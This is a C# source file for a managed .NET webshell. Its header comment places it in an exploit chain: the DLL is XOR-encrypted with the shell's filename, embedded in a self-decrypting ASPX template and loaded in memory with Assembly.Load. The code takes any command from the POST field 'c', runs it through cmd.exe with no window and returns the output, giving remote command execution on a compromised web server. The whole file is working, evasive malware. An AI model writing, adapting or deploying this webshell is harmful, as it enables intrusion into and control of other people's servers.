// webshell.cs — managed .NET webshell stub loaded by the ASPX decryptor.
//
// Compiled to webshell.dll (AnyCPU) by compile_x64.ps1 / compile_x86.ps1.
// The exploit XOR-encrypts this DLL with the shell filename and patches the
// encrypted bytes into payload_write.dll before upload. DllMain embeds the
// encrypted bytes in a self-decrypting ASPX template. At request time the
// ASPX XOR-decrypts with Path.GetFileName(Request.PhysicalPath) as key and
// loads this assembly via Assembly.Load(byte[]).
//
// Naming: class W, method R — hardcoded in the ASPX template in payload_write.c.
// POST-only: commands come from Request.Form["c"].
using System.Diagnostics;
using System.Web;

public class W {
    public static void R(HttpRequest q, HttpResponse r) {
        if (q.HttpMethod != "POST") return;
        string c = q.Form["c"];
        if (c == null) return;
        var p = new Process {
            StartInfo = new ProcessStartInfo("cmd.exe", "/c " + c) {
                UseShellExecute        = false,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                CreateNoWindow         = true
            }
        };
        p.Start();
        r.ContentType = "text/plain";
        r.Write(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
    }
}
